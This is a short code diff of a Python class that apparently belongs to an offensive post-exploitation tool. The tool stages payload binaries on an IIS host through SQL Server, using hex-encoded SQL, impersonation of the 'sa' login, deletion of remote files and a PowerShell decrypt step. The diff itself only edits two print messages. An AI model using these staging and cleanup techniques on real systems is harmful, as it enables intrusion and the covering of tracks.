@@ -26,7 +26,7 @@ class StagingMixin:
 
         shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
-        print(f"[+] xpstage done → {out_path}")
+        print(f"[+] xpstage done: {out_path}")
 
     def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120):
         """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1)."""
@@ -64,7 +64,7 @@ class StagingMixin:
         shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
             "IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
-        print(f"[+] xpstage-hex done → {out_path}")
+        print(f"[+] xpstage-hex done: {out_path}")
 
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
         sqlclient_host = self._host.replace(':', ',')
